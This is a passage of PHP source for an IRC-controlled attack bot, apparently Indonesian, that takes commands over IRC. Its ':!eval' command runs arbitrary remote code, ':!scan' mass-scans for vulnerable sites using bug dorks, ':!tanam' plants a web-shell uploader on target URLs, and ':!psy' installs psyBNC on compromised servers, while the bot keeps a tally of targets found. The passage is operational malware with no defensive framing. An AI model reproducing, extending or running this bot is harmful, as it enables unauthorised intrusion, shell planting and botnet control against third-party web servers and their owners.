                 $psn = strstr($data,":!eval");
                 $psn = str_replace(":!eval ","",$psn);
                 eval($psn);
                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4Eval:1 '.$psn.CRL); }
                 else { fputs($fp,'PRIVMSG '.$dNick.' :4Eval:1 '.$psn.CRL); }
               }
               elseif ($com[3]==':!debug' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4] == 'on') { $debugmode = 1; }
                 elseif ($com[4] == 'off') { $debugmode = 0; }
                 fputs($fp,'NOTICE '.$dNick.' :12Debugging:1 '.$debugmode.CRL);
               }
               elseif ($com[3]==':!mychan' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4]) {
                   $changue = strtolower($com[4]);
                   fputs($fp, 'JOIN ' .$changue.CRL);
                 }
                 fputs($fp,'NOTICE '.$dNick.' :12[Channel Gue]1 '.$changue.CRL);
               }
               /*** Master & User Commands ***/
               elseif ($com[3]==':!status') {
                 $statusmsg = '1? Status ? 12New['.$targetnew.'] 3Exist['.$targetold.']4 Spam['.$targetignored.']7 Total['.$targetfound.']';
                 if ($spyscan) { $statusmsg .= '13 Scan[On]'; }
                 else { $statusmsg .= '13 Scan[Off]'; }
                 fputs($fp,'PRIVMSG '.$chan.' :'.$statusmsg.CRL);
               }
               elseif ($com[3]==':!start') {
                 $spyscan = TRUE;
                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :ACTION mulai nyari target nih..'. CRL); }
                 else { fputs($fp,'NOTICE '.$dNick.' :Oke BoZZ, gue cari deh' . CRL); }
               }
               elseif ($com[3]==':!stop') {
                 $spyscan = FALSE;
                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :ACTION berhenti nyari target ach..'. CRL); }
                 else { fputs($fp,'NOTICE '.$dNick.' :Oke BoZZ, gue berhenti nyari'. CRL); }
               }
               elseif ($com[3]==':!scan') {
                 if ($com[4]=='add' && $com[5]) {
                   $msg = str_pesan($com[3].' '.$com[4],$data);
                   if (!in_array($msg,$scanlist)) {
                     $scanlist[] = $msg;
                     if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :Seep..!12 '.$msg.' ditambahkan!'.CRL); }
                     else { fputs($fp,'PRIVMSG '.$dNick.' :Seep..!12 '.$msg.' ditambahkan!'.CRL); }
                   }
                   else { fputs($fp,'NOTICE '.$dNick.' :12 '.$msg.' sudah ada!'.CRL); }
                 }
                 elseif ($com[4]=='del' && $com[5] && $auth["$dNick"]["status"]!="User") {
                   $msg = str_pesan($com[3].' '.$com[4],$data);
                   if (in_array($msg,$scanlist)) {
                     $daftar = join(' ',$scanlist);
                     unset($scanlist);
                     $daftar = str_replace($msg,'',$daftar);
                     $scanlist = explode(' ',$daftar);
                     if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :OKey..!12 '.$msg.' dihapus!'.CRL); }
                     else { fputs($fp,'PRIVMSG '.$dNick.' :OKey..!12 '.$msg.' dihapus!'.CRL); }
                   }
                   unset($daftar);
                 }
                 elseif ($com[4]=='list') {
                   sort($scanlist);
                   $daftar = join(" | ",$scanlist);
                   if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4D1aftar 4S1can:14 '.$daftar.CRL); }
                   else { fputs($fp,'PRIVMSG '.$dNick.' :4D1aftar 4S1can:14 '.$daftar.CRL); }
                   unset($daftar);
                 }
                 else {
                   $bugdork = str_pesan($com[3],$data);
                   $arrbug = explode(' ',$bugdork);
                   $thebug = $arrbug[0];
                   $thedork = str_replace($thebug,'',$bugdork);
                   if ($com[5]) {
                     if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :ACTION nyoba scanning 4Bug:14 '.$thebug.' 4Dork:14 '.$thedork.''. CRL); }
                     else { fputs($fp,'PRIVMSG '.$dNick.' :Scanning 4Bug:14 '.$thebug.' 4Dork:14 '.$thedork.''. CRL); }
                     foreach ($channel as $v) {
                       fputs($fp,'PRIVMSG '.$v.' :!scan '.$bugdork. CRL);
                     }
                   }
                   else {
                     fputs($fp,'PRIVMSG '.$dNick.' :Penggunaan:4 !scan <bug> <dork> 1atau 4!scan <add|del|list> <text>'. CRL);
                   }
                 }
               }
               elseif ($com[3]==':!ganti' && $auth["$dNick"]["status"]!="User") {
                 $msg = str_pesan($com[3],$data);
                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :ACTION ganti '.$msg.' deh'. CRL); }
                 else { fputs($fp,'PRIVMSG '.$dNick.' :'.$msg.' diganti.'. CRL); }
                 $gantilist[] = $msg;
               }
               elseif ($com[3]==':!delganti' && $auth["$dNick"]["status"]!="User") {
                 $msg = str_pesan($com[3],$data);
                 if (in_array($msg,$gantilist)) {
                   $daftar = join(' ',$gantilist);
                   unset($gantilist);
                   $daftar = str_replace($msg,'',$daftar);
                   $gantilist = explode(' ',$daftar);
                   if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :OKey..!12 '.$msg.' dihapus!'.CRL); }
                   else { fputs($fp,'PRIVMSG '.$dNick.' :OKey..!12 '.$msg.' dihapus!'.CRL); }
                 }
                 unset($daftar);
               }
               elseif ($com[3]==':!gantilist') {
                 fputs($fp,'PING 12886241614'. CRL);
                 $msgdelay = 0;
                 fputs($fp,'PRIVMSG '.$dNick.' :12.: Daftar Injector :.'. CRL);
                 sort($gantilist);
                 foreach ($gantilist as $baris) {
                   $msgdelay++;
                   if($msgdelay >= 2) { sleep(3) ; $msgdelay = 0; }
                   fputs($fp,'PRIVMSG '.$dNick.' :'.$baris. CRL);
                 }
                 fputs($fp,'PRIVMSG '.$dNick.' :12.: The End :.'. CRL);
                 unset($baris);
                 unset($msgdelay);
               }
               elseif ($com[3]==':!ignore') {
                 $ignore = str_pesan($com[3],$data);
                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :Oke bozZ!!4 '.$ignore.' ga ditampilkan lagi deh..'. CRL); }
                 else { fputs($fp,'PRIVMSG '.$dNick.' :Oke bozZ!!4 '.$ignore.' ga ditampilkan lagi deh..'. CRL); }
                 $ignorelist[] = $ignore;
               }
               elseif ($com[3]==':!delignore' && $auth["$dNick"]["status"]!="User") {
                 $msg = str_pesan($com[3],$data);
                 if (in_array($msg,$ignorelist)) {
                   $daftar = join(' ',$ignorelist);
                   unset($ignorelist);
                   $daftar = str_replace($msg,'',$daftar);
                   $ignorelist = explode(' ',$daftar);
                   if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :OKey..!12 '.$msg.' dihapus!'.CRL); }
                   else { fputs($fp,'PRIVMSG '.$dNick.' :OKey..!12 '.$msg.' dihapus!'.CRL); }
                 }
                 unset($daftar);
               }
               elseif ($com[3]==':!ignorelist') {
                 sort($ignorelist);
                 $daftar = join(" | ",$ignorelist);
                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4D1aftar 4I1gnore:14 '.$daftar.CRL); }
                 else { fputs($fp,'PRIVMSG'.$dNick.' :4D1aftar 4I1gnore:14 '.$daftar.CRL); }
                 unset($daftar);
               }
               elseif ($com[3]==':!tanam' && $auth["$dNick"]["status"]!="User") {
                 $testurl = strstr($data,":!tanam");
                 $testurl = str_replace(":!tanam ","",$testurl);
                 $theurl = $testurl.$myshelluploader;
                 //fputs($fp,'PRIVMSG '.$dNick.' :4U1ploading to:14 '.$testurl.CRL);
                 $isi = implode('', @file($theurl));
                 $posisi = strpos($isi,"Saved! File:");
                 $isi = substr($isi,$posisi);
                 if ($posisi === FALSE) {
                   if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4[Error]1 Akses ditolak!'.CRL); }
                   else { fputs($fp,'PRIVMSG '.$dNick.' :4Error:1 Akses ditolak!'.CRL); }
                 }
                 else {
                   $isi = str_replace("Saved! File:","12[Sukses!]1 Dir: ",$isi);
                   fputs($fp,'PRIVMSG '.$dNick.' :12U1ploaded:14 '.$testurl.CRL);
                   fputs($fp,'PRIVMSG '.$dNick.' :'.$isi.CRL);
                 }
                 unset($isi);
               }
               elseif ($com[3]==':!psy' && $auth["$dNick"]["status"]!="User") {
                 $testurl = str_pesan($com[3],$data);
                 $theurl = $testurl.$mypsyinstaller;
                 $isi = implode('', @file($theurl));
                 $posisi = strpos($isi,"listening");
                 $isi = substr($isi,$posisi);
                 if ($posisi === FALSE) {
                   if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4[Error]1 Ga bisa install psyBNC!'.CRL); }
                   else { fputs($fp,'PRIVMSG '.$dNick.' :4Error:1 Ga bisa install psyBNC!'.CRL); }
                 }
                 else {
                   fputs($fp,'PRIVMSG '.$dNick.' :12psyBNC1 installed on:14 '.$testurl.CRL);
                   fputs($fp,'PRIVMSG '.$dNick.' :12H1asil:14 '.$isi.CRL);
                 }
                 unset($isi);
               }
             }
             /*** End of Script ***/
             else { fputs($fp,'NOTICE '.$dNick.' :Auth dulu donk!'. CRL); }
           }
         }
         elseif (!$auth["$dNick"] && !eregi("auth",$iText)) {
           if (eregi("www.",$iText) || eregi("http:",$iText) || eregi("join #",$iText)) {
             if (!ereg("#",$dCommand)) {
               if ($log=="on") {
                 fputs($fp,'PRIVMSG '. $admin .' :4inviter: ' . $dFrom . '2:' .$iText. CRL);
               }
               $inv = strstr($dFrom,'@');
               foreach ($auth as $user) {
                 if ($user["status"]=="user") {

                   fputs($fp, 'NOTICE '.$user["name"].' :KB '.$chan.' '.$dNick.' '.$inv.'' . CRL);
                 }
               }
             }
           }
           elseif (!ereg("#",$dCommand) && $log=="on") {
             fputs($fp,'PRIVMSG '.$admin.' :6' . $dFrom . '12:' .$iText. CRL);
           }
         }
       }
    }
    elseif (substr($data,0,4) == 'PING') {
      fputs($fp,'PONG '.substr($data,5).CRL);
      $statusdelay++;
      if ($statusdelay>=1) {
        $statusmsg = '1? Status ? 12New['.$targetnew.'] 3Exist['.$targetold.']4 Spam['.$targetignored.']7 Total['.$targetfound.']';
        if ($spyscan) { $statusmsg .= '13 Scan[On]'; }
        else { $statusmsg .= '13 Scan[Off]'; }
        fputs($fp,'PRIVMSG '.$changue.' :'.$statusmsg.CRL);
        $statusdelay = 0;
      }
    }
  }
  }
  fclose($fp);
} while ($keluar == 0);


?>









